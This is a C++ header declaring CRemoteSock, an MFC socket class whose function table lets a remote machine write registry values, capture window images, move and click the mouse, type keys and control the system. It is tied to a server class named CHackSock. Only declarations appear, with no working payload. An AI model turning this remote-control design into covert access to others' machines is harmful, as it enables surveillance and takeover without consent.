#ifndef CREMOTESOCK_H
#define	CREMOTESOCK_H

#include "MyProtocol.h"

#define FTULIMIT 20
#define BUFFER 512
#define BUFSIZE 1024           
#define FILESYSNAMEBUFSIZE 1024 
// CRemoteSock command target

/*==================================================================================
Class CRemoteSock 
{
			This class is BackBone of this Project
<DataMember>	FT
				{
					Function Table Which Will Contain the Pointer
					of all the Function Which can be executed from 
					remote machine
				}
<DataMember>	addr
				{
					SOCKADDR structure to the machine to which this socket object is connected
				}
<Method>		ProcessIntr(pParam)
				{
					pParam will be splited into 
					1. int function
					2. int callback
					3. int datasize
					4. void* data
					This Function Processes the request from remote machine
					it will call the function at <function> index in FT and sends the data to the remote 
					machine what ever is returned from he FT[<function>].
				}
}
=====================================================================================
*/
/**
structure which is used to pass parameter to the sending thread ThrdSend()
*/
struct SendParam
{
	/**
	pointer to calling object
	*/
	CRemoteSock* This;
	/**
	pointer to data to be sent
	*/
	void* DataToSend;
	/**
	size of data
	*/
	long DataSize;
};

typedef void* (*Function)(void* InData,int size);
class CRemoteSock : public CSocket
{
private:
	Function FT[FTULIMIT];
	Fetch FBuff;
	//--------------------------------------------------------------
	//these are the functions which can be executed from remote system
	static void* SetRegVal(void* data ,int datasize);	//1
	static void* MyEnumWnd(void* data ,int datasize);	//2
	static void* WndFunction(void* data ,int datasize);	//3
	static void* SysInfo(void* data ,int datasize);		//4
	static void* SysCtrl(void* data,int datasize);		//5
	static void* MouseMove(void* data,int datasize);	//6
	static void* MouseClick(void* data,int datasize);	//7
	static void* MouseDClick(void* data,int datasize);	//8
	static void* GetWndBmp(void* data,int datasize);	//9
	static void* TypeKey(void* data,int datasize);		//10
	static void* SynthInput(void* data,int datasize);	//11
	//---------------------------------------------------------------
	static BOOL CALLBACK EnumWindowsProc( HWND hwnd, LPARAM lParam );
	static CString GetInfo(char* info);
	static void SystemFunction(int fn);
	static CArray<ProcInfo,ProcInfo> ProcList;
	static BOOL GetProcessList ();
	static UINT SystemFunction_Delay3(LPVOID lpParameter);
	static HWND SmallestWindowFromPoint(const POINT point);
	static UINT ThrdSend(LPVOID param);
	BOOL InitializeFunctions();

	//---------------------------------------------------------------
public:
	SOCKADDR addr;
	CHackSock* ServerSock; 
	CRemoteSock(CHackSock*);
	static UINT ProcessIntr(LPVOID pParam );
	virtual ~CRemoteSock();
	virtual void OnReceive(int nErrorCode);
	virtual void OnClose(int nErrorCode);
	virtual void OnConnect(int nErrorCode);
	virtual void OnSend(int nErrorCode);
};

#endif


